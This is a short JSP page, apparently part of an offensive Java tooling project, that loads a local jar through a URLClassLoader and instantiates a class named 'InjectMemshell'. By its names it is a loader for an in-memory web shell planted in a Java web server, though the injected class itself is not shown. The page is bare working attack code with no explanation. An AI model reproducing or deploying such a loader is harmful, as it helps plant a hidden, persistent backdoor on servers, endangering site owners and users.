<%@ page import="java.io.File" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %><%

    File var2 = new File("//Users/company/programing/java/JavaKiller/temp.jar");
    URLClassLoader var3 = new URLClassLoader(new URL[]{new URL("file:///" + var2.getAbsolutePath())});
    Class clazz = Class.forName("InjectMemshell", false, var3);
    clazz.newInstance();

%>